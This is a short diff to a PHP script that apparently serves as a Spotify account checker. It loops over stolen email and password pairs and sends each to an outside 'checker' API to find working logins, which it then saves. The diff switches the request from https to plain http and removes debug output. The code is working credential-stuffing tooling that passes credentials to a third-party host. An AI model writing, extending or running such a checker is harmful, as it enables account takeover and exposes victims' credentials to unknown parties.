@@ -20,7 +20,7 @@
 	foreach ($akun as $data) {
 		$email = $data['email'];
 		$pass = $data['pass'];
-		$url = "https://checkerz.altervista.org/spotify/api/index.php?u=$email&p=$pass";
+		$url = "http://checkerz.altervista.org/spotify/api/index.php?u=$email&p=$pass";
 
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, $url);
@@ -30,9 +30,6 @@
 		curl_close($ch);
 		$check = json_decode($html);
 
-		echo "<pre>";
-		var_dump($check);
-		
 		if ($check->status == "success") {
 			@$val["user"] = $email;
 			@$val["pass"] = $pass;
